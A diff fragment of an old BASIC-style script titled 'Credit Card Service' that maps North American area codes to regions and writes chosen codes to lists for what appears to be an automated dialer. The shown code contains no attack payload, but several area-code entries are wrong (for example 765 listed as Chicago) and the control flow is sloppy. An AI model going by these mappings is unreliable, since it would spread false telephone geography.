+ ASD2$ = "Fredericksburg, Roanoke, Spotsylvania, Stephens City, Troutville"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "541"
+ ASD1$ = "Oregon            "
+ ASD2$ = "Ashland, Bend, Corvallis, Eugene, Pendleton"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "562"
+ ASD1$ = "California (CA)   "
+ ASD2$ = ""
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "573"
+ ASD1$ = "Missouri          "
+ ASD2$ = "Columbia, Hannibal, Jefferson City"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "601"
+ ASD1$ = "Mississippi (MS)  "
+ ASD2$ = "(All)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "602"
+ ASD1$ = "Arizona (AZ)      "
+ ASD2$ = " "
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "603"
+ ASD1$ = "New Hampshire (NH)"
+ ASD2$ = "(All)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "604"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "British Columbia (BC)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "605"
+ ASD1$ = "South Dakota (SD) "
+ ASD2$ = "(All)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "606"
+ ASD1$ = "Kentucky (KY)     "
+ ASD2$ = "Covington, Winchester"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "607"
+ ASD1$ = "New York (NY)     "
+ ASD2$ = "Binghamton"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "608"
+ ASD1$ = "Wisconsin (WI)    "
+ ASD2$ = "Madison"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "609"
+ ASD1$ = "New Jersey (NJ)   "
+ ASD2$ = "Atlantic City, Camden, Trenton"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "610"
+ ASD1$ = "Pennsylvania (PA) "
+ ASD2$ = "Allentown, Boyertown, Downingtown, Fleetwood, Sadsburyville"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "612"
+ ASD1$ = "Minnesota (MN)    "
+ ASD2$ = "Minneapolis, St Paul"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "613"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Ontario (ON), Ottawa"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "614"
+ ASD1$ = "Ohio (OH)         "
+ ASD2$ = "Columbus"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "615"
+ ASD1$ = "Tennessee (TN)    "
+ ASD2$ = "Chattanooga, Nashville"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "616"
+ ASD1$ = "Michigan (MI)     "
+ ASD2$ = "Battle Creek, Grand Rapids, Kalamazoo"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "617"
+ ASD1$ = "Massachusetts (MA)"
+ ASD2$ = "Boston, New Bedford, Plymouth, Worcester"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "618"
+ ASD1$ = "Illinois (IL)     "
+ ASD2$ = "Alton, Centralia, Mt. Vernon"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "619"
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Barstow, Carlsbad, San Diego, Santee"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "626"
+ ASD1$ = "California        "
+ ASD2$ = "Burbank, Glendale, Pasadena"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "630"
+ ASD1$ = "Illinois (IL)     "
+ ASD2$ = ""
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "649"
+ ASD1$ = "TurksCaicosIslands"
+ ASD2$ = "(ALL)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "650"
+ ASD1$ = "California        "
+ ASD2$ = "Los Altos, Palo Alto,South San Francisco"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "664"
+ ASD1$ = "Montserrat        "
+ ASD2$ = "(ALL)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "670"
+ ASD1$ = "North Mariana Isl."
+ ASD2$ = "(ALL)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "671"
+ ASD1$ = "Guam              "
+ ASD2$ = "(ALL)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "700"
+ ASD1$ = "Lifetime phone    "
+ ASD2$ = ""
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "701"
+ ASD1$ = "North Dakota (ND) "
+ ASD2$ = "(All)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "702"
+ ASD1$ = "Nevada (NV)       "
+ ASD2$ = "(All)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "703"
+ ASD1$ = "Virginia (VA)     "
+ ASD2$ = "Arlington, Roanoke, Winchester"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "704"
+ ASD1$ = "North Carolina    "
+ ASD2$ = "Charlotte, Salisbury"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "705"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Ontario (ON), North Bay"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "706"
+ ASD1$ = "Georgia (GA)      "
+ ASD2$ = "Augusta, Martinez, Columbus"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "707"
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Santa Rosa"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "708"
+ ASD1$ = "Illinois (IL)     "
+ ASD2$ = "Northbrook, Antioch, Evanston, Elgin, Harvey, Peotone"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "709"
+ ASD1$ = "Canada (CN)!      "
+ ASD2$ = "Newfoundland (NF), Labrador"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "712"
+ ASD1$ = "Iowa (IA)         "
+ ASD2$ = "Council Bluffs"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "713"
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "Pasadena, Houston, Rosenberg"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "714"
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Orange County"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "715"
+ ASD1$ = "Wisconsin (WI)    "
+ ASD2$ = "Eau Claire, Wausau"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "716"
+ ASD1$ = "New York (NY)     "
+ ASD2$ = "Buffalo, Niagara Falls, Rochester"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "717"
+ ASD1$ = "Pennsylvania (PA) "
+ ASD2$ = "Harrisburg, Scranton"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "718"
+ ASD1$ = "New York (NY)     "
+ ASD2$ = "Brooklyn, Queens, Staten Island"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "719"
+ ASD1$ = "Colorado (CO)     "
+ ASD2$ = "Colorado Springs, Pueblo, Canon City"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "732"
+ ASD1$ = "New Jersey        "
+ ASD2$ = "Long Branch, New Brunswick"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "757"
+ ASD1$ = "Virginia          "
+ ASD2$ = "Norfolk, Newport News, Williamsburg"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "758"
+ ASD1$ = "St Lucia          "
+ ASD2$ = "(ALL)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "760"
+ ASD1$ = "California        "
+ ASD2$ = "Barstow, Palm Springs"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "765"
+ ASD1$ = "Indiana           "
+ ASD2$ = "Chicago"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "770"
+ ASD1$ = "Georgia (GA)      "
+ ASD2$ = "Atlanta, Conyers, Decatur, Marietta, Riverdale"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "773"
+ ASD1$ = "Illinois          "
+ ASD2$ = "Chicago"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "787"
+ ASD1$ = "Puerto Rico       "
+ ASD2$ = "(ALL)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "800"
+ ASD1$ = "Toll Free In U.S. "
+ ASD2$ = ""
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "801"
+ ASD1$ = "Utah (UT)         "
+ ASD2$ = "(All)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "802"
+ ASD1$ = "Vermont (VT)      "
+ ASD2$ = "(All)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "803"
+ ASD1$ = "South Carolina    "
+ ASD2$ = "(All)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "804"
+ ASD1$ = "Virginia (VA)     "
+ ASD2$ = "Charlottesville, Newport News, Norfolk, Richmond"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "805"
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Bakersfield"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "806"
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "Amarillo, Borger, Dalhart, Lubbock"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "807"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Ontario (ON), Thunder Bay"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "808"
+ ASD1$ = "Hawaii (HI)       "
+ ASD2$ = "(All)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "809"
+ ASD1$ = "Various Location  "
+ ASD2$ = "Anguilla,Antigua,Bahamas,Barbados,Bequia,Bermuda,Cayman Islands,Dominican Rep,Jamaica,Montserrat,Palm Island,Puerto Rico (PR),St Lucia,St Vincent,Trinidad,Tobago,Union Island,Virgin Islands (VI)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "810"
+ ASD1$ = "Michigan (MI)     "
+ ASD2$ = "Brighton,Flint,Pontiac,Mt. Clemens,Snover,Warren,Troy,Madison Heights,Port Huron,Royal Oak,Oak Park,Southfield"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "812"
+ ASD1$ = "Indiana (IN)      "
+ ASD2$ = "Evansville"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "813"
+ ASD1$ = "Florida (FL)      "
+ ASD2$ = "Ft. Myers, Winter Haven"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "814"
+ ASD1$ = "Pennsylvania (PA) "
+ ASD2$ = "Altoona, Erie"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "815"
+ ASD1$ = "Illinois (IL)     "
+ ASD2$ = "Rockford, Woodstock, Joliet"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "816"
+ ASD1$ = "Missouri (MO)     "
+ ASD2$ = "Belton, Independence, Kansas City, Marshall, St Joseph, Sedalia"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "817"
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "Denton, Fort Worth, Temple, Waco"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "818"
+ ASD1$ = "California (CA)   "
+ ASD2$ = "San Fernando Valley Area"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "819"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Quebec (PQ)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "830"
+ ASD1$ = "Texas             "
+ ASD2$ = "Fredericksburg, Kerrville, San Antonio"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "847"
+ ASD1$ = "Illinois          "
+ ASD2$ = "Chicago, Evanston, Waukegan"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "850"
+ ASD1$ = "Florida           "
+ ASD2$ = "Panama City, Pensacola, Tallahassee"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "860"
+ ASD1$ = "Connecticut       "
+ ASD2$ = "Hartford"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "864"
+ ASD1$ = "South Carolina    "
+ ASD2$ = "Anderson, Greenville, Spartanburg"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "867"
+ ASD1$ = "Northwest Territ. "
+ ASD2$ = "Whitehorse"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "868"
+ ASD1$ = "Trinidad & Tobago "
+ ASD2$ = "(ALL)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "869"
+ ASD1$ = "St Kitts & Nevis  "
+ ASD2$ = "(ALL)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "870"
+ ASD1$ = "Arkansas          "
+ ASD2$ = "El Dorado, Jonesboro, Paine Bluff"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "876"
+ ASD1$ = "Jamaica           "
+ ASD2$ = "(ALL)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "888"
+ ASD1$ = "Toll-Free         "
+ ASD2$ = "free for caller"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "900"
+ ASD1$ = "Additional Charges"
+ ASD2$ = "Pay-Per-Call (caller pays)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "901"
+ ASD1$ = "Tennessee (TN)    "
+ ASD2$ = "Memphis"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "902"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = "Prince Edward Island (PE), Nova Scotia (NS)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "903"
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "Greenville, Longview, Texarkana, Tyler"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "904"
+ ASD1$ = "Florida (FL)      "
+ ASD2$ = "Jacksonville, Tallahassee"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "905"
+ ASD1$ = "Canada (CA)       "
+ ASD2$ = "Ontario (ON),Burlington,Bowmanville,Hamilton,Mississauga,Oshawa,St.Catharines,Welland,Niagara Falls"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "906"
+ ASD1$ = "Michigan (MI)     "
+ ASD2$ = "Escanaba, Marquette, Sault Ste. Marie"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "907"
+ ASD1$ = "Alaska (AK)       "
+ ASD2$ = "(All)"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "908"
+ ASD1$ = "New Jersey (NJ)   "
+ ASD2$ = "Edison"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "909"
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Ontario, Riverside, San Bernardino"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "910"
+ ASD1$ = "North Carolina    "
+ ASD2$ = "Asheboro, Fayetteville, Mt Airy, Wilkesboro, Wilmington"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "912"
+ ASD1$ = "Georgia (GA)      "
+ ASD2$ = "Savannah, Waycross"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "913"
+ ASD1$ = "Kansas (KS)       "
+ ASD2$ = "Lawrence, Manhattan, Salina, Topeka"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "914"
+ ASD1$ = "New York (NY)     "
+ ASD2$ = "White Plains"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "915"
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "Abilene, Alpine, Big Spring, El Paso, Midland, Odessa"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "916"
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Sacramento"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "917"
+ ASD1$ = "New York (NY)     "
+ ASD2$ = "New York City"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "918"
+ ASD1$ = "Oklahoma (OK)     "
+ ASD2$ = "Bartlesville, Mcalester, Muskogee, Tulsa"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "919"
+ ASD1$ = "North Carolina    "
+ ASD2$ = "Greenville, Raleigh, Winston,Salem"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "920"
+ ASD1$ = "Wisconsin         "
+ ASD2$ = "Green Bay, Oshkosh"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "937"
+ ASD1$ = "Ohio              "
+ ASD2$ = "Middletown, Springfield, Wilmington, Xenia"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "940"
+ ASD1$ = "Texas             "
+ ASD2$ = "Denton, Wichita Falls"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "941"
+ ASD1$ = "Florida (FL)      "
+ ASD2$ = "Bradenton, Englewood, Fort Myers, Lakeland, Naples, Sarasota"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "954"
+ ASD1$ = "Florida (FL)      "
+ ASD2$ = ""
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "956"
+ ASD1$ = "Texas             "
+ ASD2$ = "Brownsville, McAllen"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+ 
+Endif
+IF A$ == "970"
+ ASD1$ = "Colorado (CO)     "
+ ASD2$ = "Ft Collins, Greeley, Loveland"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "972"
+ ASD1$ = "Texas             "
+ ASD2$ = "Dallas, Garland, Grand Prairie, Irving, Plano"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "973"
+ ASD1$ = "New Jersey        "
+ ASD2$ = "Newark, Paterson"
+ GoTo tarea_w
+ RETURN
+ Else ASD1$ = "None"
+Endif
+
+IF A$ == "999"
+ ASD1$ = "ALL SELECTED      "
+ ASD2$ = " "
+ RETURN
+Endif
+
+IF ASD1$ == "None"
+ A$=""
+Endif
+RETURN
+
+Tarea_w:
+If Exists (AL1$)
+  open Append 1, AL1$
+  write #1,A$
+  Close #1
+  C=C+1
+ else 
+  open OutPut 1, AL1$
+  write #1,A$
+  Close #1
+  C=C+1
+endif
+
+
+If Exists (AL2$)
+  open Append 1, AL2$
+  write #1,A$
+  Close #1
+  C=C+1
+ else 
+  open OutPut 1, AL2$
+  write #1,A$
+  Close #1
+  C=C+1
+endif
+GOTO Label_1
+
+
+
+
+AREACODE:
+If C==205
+  A$="999"
+  ASD1$="ALL SELECTED     "
+Endif
+If A$=="END_OF_FILE"
+ A$=""
+endif
+CLS
+Print Local "                                                    ###"
+Print Local " [0m Credit Card Service V."Version$"     Time:"time$ "    [0m   [0m@ @[0m    [0mDate:"date$
+Print Local " [33m-----------------------------------------------[0moOO[33m-[0m(_)[33m-[0mOOo[33m-------------[0m"
+Print Local
+Print Local " -*- AreaCode Control Menu -*-"
+Print Local
+Print Local "[33m Areacode.....[0m>: "A$
+Print Local "[33m State........[0m>: "ASD1$
+Print Local "[33m Time.........[0m>: "timeh$+":"+timem$+":00"
+Print Local "[33m Selected.....[0m>: "C
+Print Local
+Print Local "[33m # [0mLoad/Use Default([33ms[0m)[33m.  [33m C [0mClear AreaCode([33ms[0m)[33m.[0m"
+Print Local "[33m * [0mAll AreaCode([33ms[0m)[33m.[0m      [33m + [0mView AreaCode([33ms[0m)[33m."
+Print Local "[33m - [0mPhone Digit([33ms[0m)[33m.[0m     [33m *** [0mLoad AreaCode([33ms[0m)[33m."
+Print Local
+Print Local "                                           123"
+INPUT LOCAL "[33mAreaCode[0m (3 Digits  *,C,#,-,+,***)..... >: ",A$
+	A$ = LOWER$(A$)
+
+	If A$=="***"
+	  Print Local
+	  Print Local
+	  INPUT LOCAL "[33mAreaList FileName (*=Default)[0m..... >: ",ALS$
+	   If ALS$=="*"
+		ALS$="ENV:AreaCode.Prefs"
+	   Endif
+	   If exists (ALS$)
+	     C=0
+	     Open Output 2,AREA$
+	          Close #2
+	     Open input 1,ALS$
+	     ARTN:
+	          Read #1, A$
+		  C=C+1
+		  IF A$ == "END_OF_FILE"
+		  Close #1
+		  A$=""
+		  ASD1$=ALS$
+		  Goto areacode
+		  else
+	     Open append 2,AREA$
+		  Write #2, A$
+		  Close #2
+	     goto ARTN
+	     endif
+	   else
+	     BEEP
+	     Print Local ;"INVALID FILENAME !"
+	     Pause 1
+	     ALS$=""
+	     A$=""
+	     Goto areacode
+	   Endif
+	Endif
+
+	if A$==""
+	 Gosub INT
+	 Goto MainMenu
+	endif
+	if A$=="c"
+	 Gosub AREA_I
+	endif
+	if A$=="+"
+	 open input 1, "ENV:Dialer00.prefs"
+	 read #1, A$
+	 CLOSE #1
+	 Gosub AREA_V
+	endif
+	if A$=="-"
+	 open input 1, "ENV:Dialer00.prefs"
+	 read #1, A$
+	 B$=""
+	 CLOSE #1
+	 Goto PHONES
+	endif
+	if A$=="*"
+	 Gosub DIAL_ALL
+	endif
+	If A$=="#"
+	 open input 1, "ENV:Dialer00.prefs"
+	 read #1, A$
+	 CLOSE #1
+	 Gosub INT
+	Endif
+	gosub check
+	GoSub INT
+	Goto AREACODE
+END
+
+
+INT:
+IF A$ == "011" 
+ ASD1$ = "International Call"
+ ASD2$ = " "
+ GoSub AREA_W
+ RETURN
+ Else ASD1$ = "None"  
+Endif
+IF A$ == "201" 
+ ASD1$ = "New Jersey (NJ)   "
+ ASD2$ = "Hackensack, Newark, New Brunswick, Paterson"
+ GoSub AREA_W
+ RETURN
+ Else ASD1$ = "None" 
+Endif
+IF A$ == "202" 
+ ASD1$ = "Washington DC (DC)"
+ ASD2$ = ""
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "203" 
+ ASD1$ = "Connecticut (CT)  "
+ ASD2$ = "(All)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "204"
+ ASD1$ = "Canada (CN)       "
+ ASD2$ = ""
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "205"
+ ASD1$ = "Alabama (AL)      "
+ ASD2$ = ""
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "206"
+ ASD1$ = "Washington (WA)   "
+ ASD2$ = ""
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "207"
+ ASD1$ = "Maine (ME)        "
+ ASD2$ = "(All)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "208"
+ ASD1$ = "Idaho (ID)        "
+ ASD2$ = "(All)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "209"
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Fresno"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "210"
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "San Antonio,Brownsville,McAllen,Bandera, Fredericksburg,Edinburg,Alamo"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "212"
+ ASD1$ = "New York (NY)     "
+ ASD2$ = "New York City"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "213"
+ ASD1$ = "California (CA)   "
+ ASD2$ = "Central Los Angeles, Hollywood"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "214"
+ ASD1$ = "Texas (TX)        "
+ ASD2$ = "Dallas, Denison, Paris, Sherman, Ennis, Greenville"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "215"
+ ASD1$ = "Pennsylvania (PA) "
+ ASD2$ = "Allentown(Lehigh Co.),Philadelphia,Lansdale,Levittown,Newtown,Quakertown"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "216"
+ ASD1$ = "Ohio (OH)         "
+ ASD2$ = "Akron, Cleveland, Youngstown"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "217"
+ ASD1$ = "Illinois (IL)     "
+ ASD2$ = "Springfield"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "218"
+ ASD1$ = "Minnesota (MN)    "
+ ASD2$ = "Duluth"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "219"
+ ASD1$ = "Indiana (IN)      "
+ ASD2$ = "Gary, South Bend, Warsaw"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "240"
+ ASD1$ = "Maryland          "
+ ASD2$ = "Cumberland, Frederick, Hagerstown"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "242"
+ ASD1$ = "Bahamas           "
+ ASD2$ = "(ALL)"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "248"
+ ASD1$ = "Michigan          "
+ ASD2$ = "Novi, Waterford, Troy"
+ GoTo AREA_W
+ RETURN
+ Else ASD1$ = "None"
+Endif
+IF A$ == "250"
+ ASD1$ = "British Columbia  "
+ ASD2$ = "Interior, Vancouver Island) and Alaska (major city: Hyder)"
